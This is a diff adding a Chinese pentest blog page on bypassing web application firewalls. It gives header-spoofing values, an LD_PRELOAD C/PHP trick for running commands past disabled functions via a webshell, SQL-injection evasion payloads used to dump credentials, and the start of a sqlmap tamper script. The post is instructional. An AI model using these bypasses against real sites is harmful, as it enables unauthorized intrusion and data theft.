@@ -1,0 +1,1152 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Ehiyor">
+    
+    <title>
+        
+            waf绕过 |
+        
+        Ehiyor&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-keep@4.2.5/source/font/css/brands.min.css">
+    
+        
+            
+                
+<link rel="stylesheet" href="/css/hide.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"yxhhyy.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Ehiyor's blog","author":"Ehiyor","avatar":"/images/1.jpg","logo":"/images/1.jpg","favicon":"/images/logo.svg"},"menu":{"home":"/                        || fa-solid fa-home","archives":"/archives            || fa-solid fa-box-archive","tags":"/tags                    || fa-solid fa-tags","links":"/links                  || fa-solid fa-link","about":"/about                  || fa-solid fa-user-graduate"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"この人生に誠実になって幸せに生きてください","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/yxhhyy","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"渗透测试learner"},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"updated_datetime_icon":"fa-solid fa-arrows-rotate","reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"left"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"gitalk","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"unpkg"},"pjax":{"enable":true},"footer":{"since":null,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":["/css/hide.css"],"js":[null]},"aplayerInject":{"enable":true,"per_page":true},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+
+<!-- APlayer 样式 -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+
+<!-- APlayer JS -->
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+
+<!-- MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script>
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/1.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Ehiyor&#39;s blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/links">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-link"></i>
+                                
+                                友链
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                    <i class="menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
+                                </span>
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
+                                </span>
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
+                                </span>
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/links">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-link"></i>
+                                </span>
+                            
+                            友链
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                                <span class="menu-icon-wrap border-box flex-center">
+                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-user-graduate"></i>
+                                </span>
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        waf绕过
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/1.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Ehiyor</span>
+                                
+                                    <span class="author-badge">渗透测试learner</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-02-08 16:41:17</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-arrows-rotate"></i>&nbsp;
+                    <span class="datetime" data-updated="Sat Feb 08 2025 16:43:46 GMT+0800">2025-02-08 16:43:46</span>
+                </span>
+            
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%85%8D%E6%9D%80/">免杀</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <blockquote>
+<p>网站的防护：</p>
+<ol>
+<li>
+<p>源码自带的防护代码（注入、上传、XSS等存在拦截）</p>
+</li>
+<li>
+<p>软件WAF：</p>
+<p>各种 web 漏洞，提权组件，owasptop10，访问速度，指纹拦截</p>
+<p><strong>安全狗、D盾、云锁、云盾、360等 waf</strong></p>
+<p>比如说你使用 sqlmap 然后他识别了你的指纹 org ，那么即使你的注入语句可以过 waf，也会被拦截</p>
+<p>安全狗（你执行的注入语句被他检测出来之后会被拦截，但是不会封你 ip，当他认为你是cc攻击的时候才会封你 ip，那么什么是cc攻击？目录扫描速度过快，sqlmap跑注入速度过快都会认为你是cc攻击，一般1秒钟访问超过10次就会封你，一般每次封锁的时间为5分钟）</p>
+</li>
+<li>
+<p>硬件WAF：</p>
+<p>主要防御流量和一些web攻击</p>
+<p>比如说天融信，一旦识别到你存在注入行为，他的防火墙就会直接封你 IP</p>
+<p>阿里云的硬件 waf 不光会拦截 web 漏洞攻击，就连速度过快的 ddos 也会被拦截，一封就是1h</p>
+</li>
+<li>
+<p>云WAF</p>
+</li>
+</ol>
+</blockquote>
+<ul>
+<li>一定要注意软件的指纹信息清理或者修改</li>
+<li><strong>封锁 IP有两种方式，一种是通过 http 请求，还有一种是通过 TCP 获取 ip 来封锁的（硬件 waf 常见）</strong>
+<ol>
+<li>如果是通过 http 请求头来获取 IP 封锁的，那我们就可以通过插件<code>fakeip</code>修改<code>client-ip</code>或者<code>x-forward-for</code>等来绕过</li>
+<li>用代理（换IP来访问），这个时候就引入了代理池</li>
+</ol>
+</li>
+</ul>
+<blockquote>
+<p>waf 拦截的两个方向：</p>
+<ul>
+<li>基于 ip 封锁（cc 攻击、ddos 等态势感知）</li>
+<li>基于 web 应用攻击（web 漏洞攻击拦截，指纹）</li>
+</ul>
+<p>通用型防护代码：注入、上传、XSS等地方，针对注入：</p>
+<ol>
+<li>大小写替换</li>
+<li><strong>变换提交方式（get、post、cookie）</strong></li>
+<li>编码绕过（url 编码，基于语句重叠，添加注释符号等等）</li>
+</ol>
+</blockquote>
+<h2 id="waf-防护原理讲解"><a class="markdownIt-Anchor" href="#waf-防护原理讲解"></a> WAF 防护原理讲解</h2>
+<p>d盾拦截注入、上传、webshell、菜刀等等拦截的很厉害</p>
+<p>下面这个我们在执行注入的时候被拦截了，然后看这个大E，这个就是安全狗</p>
+<p><img lazyload alt="image" data-src="image-20250205161801214.png"><br>
+<img lazyload alt="image" data-src="image-20250205161929103.png"></p>
+<p>宝塔的 waf：<code>ngx_lua_waf</code> ，这个 waf 的拦截页面和安全狗很相似，但是没有这个大e</p>
+<p><img lazyload alt="image" data-src="image-20250205162232392.png"></p>
+<h2 id="目录扫描绕过waf"><a class="markdownIt-Anchor" href="#目录扫描绕过waf"></a> 目录扫描绕过waf</h2>
+<p>目录扫描被封锁的原因：1. 指纹    2. 速度，如果速度过快还会被封锁 IP</p>
+<p>那么我们先来解决第一个问题，也就是指纹的问题，我们可以尝试更换指纹，比如在<code>Dirbuster</code>目录扫描工具里面，我们可以通过修改<code>User Agent</code>头来修改指纹，这样就可以绕过一些 waf</p>
+<p><img lazyload alt="image" data-src="image-20250205173906604.png"></p>
+<p>然后就是第二个速度的问题，因为速度过快会被防火墙封锁 ip，所以我们可以尝试减慢扫描的速度，但这样的话就比较难受了，因为目录扫描就是需要速度，所以我们可以尝试使用代理池来绕过，搞一个代理池，假如说里面有十万个代理 IP，验证看看那些 IP 可以访问目标，然后使用这些验证后的挨个访问目标，如下：</p>
+<p><img lazyload alt="image" data-src="image-20250206115831923.png"></p>
+<p>刚刚测试了一下那个 proxypool 的免费代理池工具，真就狗屎，用不了一点，一个 ip 都用不了，不如 glider</p>
+<p>当然有一些是通过识别 http 请求来识别 IP，我们就可以尝试通过修改<code>client-ip</code>等参数来进行绕过</p>
+<h2 id="禁用命令执行函数"><a class="markdownIt-Anchor" href="#禁用命令执行函数"></a> 禁用命令执行函数</h2>
+<p>如果我们发现目标会禁用我们使用命令执行函数来执行命令的话，可以编写一个 C 程序，然后程序里面写上要执行的命令，比如我们现在编写一个 <code>hack.c</code>文件，文件内容如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;rm /tmp/check.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后我们就可以对这个文件进行编译：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack.o</span><br><span class="line">gcc -shared hack.o -o hack.so</span><br></pre></td></tr></table></figure>
+<p>之后将得到的动态库文件上传到 webshell 上，然后写一段简单的 php 代码，用来调用这个库文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/var/www/hack.so&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@localhost&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在浏览器中打开就可以执行它，然后再去检查新建的文件是否还存在，找不到文件则表示系统成功执行了删除命令，也就意味着绕过成功，测试中注意修改为实际路径。</p>
+<h2 id="访问受限绕过"><a class="markdownIt-Anchor" href="#访问受限绕过"></a> 访问受限绕过</h2>
+<p>就比如我们访问到了一个网站的后台<code>/admin</code>，但是页面回显为：403、501、500、401（未授权）等等，这种的话，我们第一步需要去探测它是通过 <code>tcp ip</code>的限制还是通过 <code>http</code> 来限制的，如果是<code>http</code>，那我们直接上插件，然后修改下面的这些参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:134.27.38.209</span><br><span class="line">X-Forwarded-Host:134.27.38.209</span><br><span class="line">X-Client-IP:134.27.38.209</span><br><span class="line">X-remote-IP:134.27.38.209</span><br><span class="line">X-remote-addr:134.27.38.209</span><br><span class="line">True-Client-IP:134.27.38.209</span><br><span class="line">X-Client-IP:134.27.38.209</span><br><span class="line">Client-IP:134.27.38.209</span><br><span class="line">X-Real-IP:134.27.38.209</span><br></pre></td></tr></table></figure>
+<p>我们可以将这些参数后的 IP 修改为目标管理员的 ip 来绕过一些限制，比如后台限制 IP 的时候就可以这样去绕过</p>
+<ul>
+<li>
+<p>实例突破后台 ip 限制：</p>
+<p>就比如我们使用 XSS 打过来之后，使用插件修改 ip 为目标管理员 ip（前提是<strong>目标通过 http 请求来限制 IP</strong>）</p>
+<p>如果目标的 IP 是外网的某一个段的（比如某一个地区：浙江），并且使用的是 tcp 来验证，这个时候插件就不管用了，就得使用代理池，我们可以在一些代理网站里面看看有没有一个段的 IP 来进行突破</p>
+</li>
+</ul>
+<p>还有访问 3389 端口，目标只允许某一个特定的 IP 访问，也就是对 IP 进行了封锁（<strong>401、403、501这些都是对 IP 进行了封锁</strong>），这个时候我们就可以通过端口转发来解决突破，比如可以使用<code>lcx</code>将端口转发到我们的 vps 上面，然后直接连接 vps 的端口即可，当然也可以使用 msf，在建立连接之后，使用 <code>portfwd add</code> 来实现端口转发</p>
+<h2 id="手工注入绕过-waf"><a class="markdownIt-Anchor" href="#手工注入绕过-waf"></a> 手工注入绕过 waf</h2>
+<p>我们先搭建一个有着注入以及 waf 的网站，然后先尝试注入<code>and 1=1</code>，可以看到直接被拦截了，并且是安全狗</p>
+<p><img lazyload alt="image" data-src="image-20250206173828940.png"></p>
+<p>然后我们介绍几种绕过的方法：</p>
+<ol>
+<li>大小写变种</li>
+<li>使用SQL注释</li>
+<li>使用URL编码</li>
+<li>使用空字节</li>
+<li>使用嵌套过滤剥离</li>
+<li>使用非标准入口点</li>
+<li>避开自定义过滤器</li>
+</ol>
+<p>下面是一些数据库以及相关的注释符和空白字符：</p>
+<table>
+<thead>
+<tr>
+<th>数据库系统</th>
+<th>注释符</th>
+<th>空白字符</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>MySQL</strong></td>
+<td>- <code>#</code> （单行注释）<br>- <code>-- </code>（注意后面需跟随一个空格或其他字符，单行注释）<br>- <code>/* ... */</code>（多行注释）</td>
+<td><code>%09</code>（水平制表符）<br><code>%0A</code>（换行符）<br><code>%0B</code>（垂直制表符）<br><code>%0C</code>（换页符）<br><code>%0D</code>（回车符）<br><code>%20</code>（空格）</td>
+</tr>
+<tr>
+<td><strong>Oracle</strong></td>
+<td>- <code>--</code>（单行注释，后需跟空格或其他字符）<br>- <code>/* ... */</code>（多行注释）</td>
+<td><code>%00</code>（NULL字符）<br><code>%09</code>（水平制表符）<br><code>%0A</code>（换行符）<br><code>%0B</code>（垂直制表符）<br><code>%0C</code>（换页符）<br><code>%0D</code>（回车符）<br><code>%20</code>（空格）</td>
+</tr>
+<tr>
+<td><strong>MSSQL</strong></td>
+<td>- <code>--</code>（单行注释，用法与上述相同）<br>- <code>/* ... */</code>（多行注释）</td>
+<td><code>%00</code>至<code>%20</code>（包括NULL字符在内的所有ASCII空白字符）</td>
+</tr>
+</tbody>
+</table>
+<p>然后这里面比较有用的一个方法就是注释：</p>
+<ul>
+<li>
+<p>URL 参数污染</p>
+<ol>
+<li>
+<p>可以用注释和空字符和内联注释来进行污染</p>
+<p>这里要注意的是这些注释必须是被目标系统支持的，然后就是污染，比如说我们使用 <code>%0a</code> 来进行污染，我们可以使用<code>%%%%%%%%%%0a</code>这种来代替空格，可以正常运行，并且可以过宝塔、WTS</p>
+<p>上面的 <strong>这些空白字符都可以用来代替空格</strong> 进行绕过，当然也可以使用<code>+</code>来代替，这个能过 360</p>
+<p>Mysql 用的比较多的就是：<code>--</code>、<code>#</code>、<code>%23</code>、<code>/* */</code>、<code>/*!50001 */</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内联注入：<span class="comment">/*!select version()*/</span></span><br><span class="line"><span class="comment">/*!select*/</span> version(); 这里面的 <span class="keyword">select</span> 是可以起作用的，因为加入了<span class="operator">!</span> 表示非注释</span><br><span class="line"><span class="comment">/*!10000select*/</span> version(); 这条语句也是可以执行的，数字最好是 <span class="number">5</span> 位的，就比如下面这个就是用 <span class="number">44444</span> 过掉的，这个网站用的 waf 是安全狗</span><br></pre></td></tr></table></figure>
+<p><img lazyload alt="image" data-src="image-20250206182119686.png"><br>
+<img lazyload alt="image" data-src="image-20250206182245421.png"></p>
+<p><img lazyload alt="image" data-src="image-20250206182624543.png"></p>
+<p>然后就是上面这个，我们解释一下：在 <code>union</code>后面加上一个<code>%23</code> 也就是注释符，将后面全部注释之后页面回显了网站的CMS，但是下面没有内容，因为是单行注释，所以我们再后面加上一个换行<code>%0a</code>，这么一来就可以正常回显了，那么问题来了，为什么不在数字这一块发力，因为给每一个数字包裹很费时然后就是不管如何处理都会被拦截，所以才将目光转向了 <code>union</code> 和 <code>select</code> 中间，emmm，反正就是多测试几个位置</p>
+<p>上面这里测试后可以得出这个 waf 主要拦截的就是<code>union select</code>，所以我注释换行就绕过了</p>
+<p>然后就是爆破数据库：</p>
+<p><img lazyload alt="image" data-src="image-20250206183120378.png"></p>
+<p>我们可以在回显位写上<code>database</code>，但是被拦截了，那就在后面加上一个<code>%23%0a</code>，先单行注释，然后换行</p>
+<p>之后就是爆破数据表：</p>
+<p><img lazyload alt="image" data-src="image-20250206183350684.png"></p>
+<p>这里就很简单了，只是对表名进行了十六进制编码，然后列名也是一样，如下：</p>
+<p><img lazyload alt="image" data-src="image-20250206183914422.png"></p>
+<p>最后直接爆破出账密：</p>
+<p><img lazyload alt="image" data-src="image-20250206184013561.png"></p>
+<p>上面使用的 waf 是安全狗，然后我们换成 D 盾看看怎么个事</p>
+<p><img lazyload alt="image" data-src="image-20250206184545597.png"><br>
+<img lazyload alt="image" data-src="image-20250206184807902.png"></p>
+<p>可以看到绕过了，绕过的方法也很简单，在<code>/**/</code>里面随便加上一些字符，然后加上一个<code>&amp;lt;</code>，然后将他进行<strong>URLencode</strong>，编码之后为：<code>%26lt%3B</code> 最后用这个整体来代替空格使用</p>
+</li>
+<li>
+<p>使用长度来进行污染，可以使用垃圾字符来增加提交内容的长度，就比如说我们再进行注入的时候，可以加上一些不会影响结果的参数，然后多写几个，类似于：<code>?id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1</code> ，这里要注意的是 waf 拦截的长度是有一定的限制的，太长的话可能会导致内存溢出</p>
+<p><strong>长度污染一般是用在 post 提交或者上传的时候</strong></p>
+</li>
+</ol>
+<blockquote>
+<p><strong>然后我们总结一下手工注入过 waf 的一些方法：</strong></p>
+<ol>
+<li>
+<p>注释，内联注释，空白字符，脏数据，当行注释，换行符等等</p>
+<p>在 mysql 中：</p>
+<ol>
+<li><code>/*asdasd*/</code></li>
+<li><code>/*!union*/</code>：这个因为加上了<code>！</code>所以里面的<code>union</code>是可以执行的</li>
+<li><code>/*!44444and*/</code>：这里面是加入了数字，用来绕过一些过滤，但是里面的<code>and</code>是可以执行的，并且因为整体是一个注释符，所以连接下一个的时候中间不需要加任何空白字符</li>
+<li><code>%23</code>：这个其实就是<code>#</code>，因为是单行注释，所以可以配合<code>%0a</code>换行符来使用</li>
+<li><code>--</code> 和 <code>--+</code></li>
+</ol>
+<p>然后是 access+asp 里面，使用空白字符替换空格的方法如下：</p>
+<ul>
+<li>可以使用<code>%0a</code>（换行）、<code>%0d</code>（回车）、<code>%09</code>（Tab）</li>
+<li>还可以使用 <code>%%%%%%%%%0a</code> 这种重复的<code>%</code>，通过不断加长来超过 waf 的拦截长度，这种可以绕过 <strong>wts-waf</strong>、宝塔自带的 asp 的 access 拦截的 waf，但是要注意的是也不能太长，太长服务器可能就不会接受了，所以这种方法一般是用在 post 传参里面的，因为 post 传参可以接受的长度远远大于 get 传参</li>
+<li>使用<code>+</code> 替换，同时可以加上一定的大小写绕过，比如说：<code>+anD+1=1</code> 这种方法可以过掉 360</li>
+</ul>
+</li>
+<li>
+<p>变换提交方式（get、post、cookie）</p>
+<p>但是这个也要注意一点，那就是服务器是否允许你通过其他传参方式提交</p>
+<p>然后就是在<code>access+asp</code> 的站点，安全狗会把 <strong>post</strong> 提交的语句中间的空格替换为空，比如说：<code>and 1=1</code>会被变为<code>and1=1</code> 这个时候该如何绕过：可以使用<code>%0a</code>也就是换行符或者是<code>+</code>来代替空格</p>
+</li>
+<li>
+<p>进行编码（一般是URLencode）或者是大小写绕过，但是这里要注意：因为我们使用空白字符绕过的时候，用的就是URL编码之后的，所以我们再次编码之后服务器可能就无法解析了，因为大部分服务器只进行一次解码</p>
+<p><strong>所以在存在空白字符的时候，尽量不要使用 URLencode</strong></p>
+</li>
+</ol>
+<p>说了这么多绕过的方法，但其实最重要的还是灵活的组合应用，比如说我们使用<code>%0a</code>来代替空格，但是可能无法绕过，那就试着组合一下，比如说将 get 请求转换为 post 请求，然后使用<code>%%%%%%0a</code>来代替空格，之后再加入大小写，这样说不定就可以绕过一些 waf，<strong>所以打组合拳很重要</strong></p>
+</blockquote>
+</li>
+</ul>
+<p>但是这个时候问题又来了，那就是使用手工注入的话，效率太低了，所以还是得用工具，这里就用 sqlmap来举例，就比如我们刚刚测试的安全狗，我们刚刚是已经成功手工绕过了，方法：<code>/*!44444union*/</code> 将我们的语句加入到内联注释里面来进行绕过，那么这个时候，我们就可以将这个经验写成脚本，当然不用我们自己重新手搓一个脚本，我们只需要将他自带的脚本修改一下即可，当然现在已经有这个脚本了，但是我们需要培养这种思想：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># modsecurityzeroversioned.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = 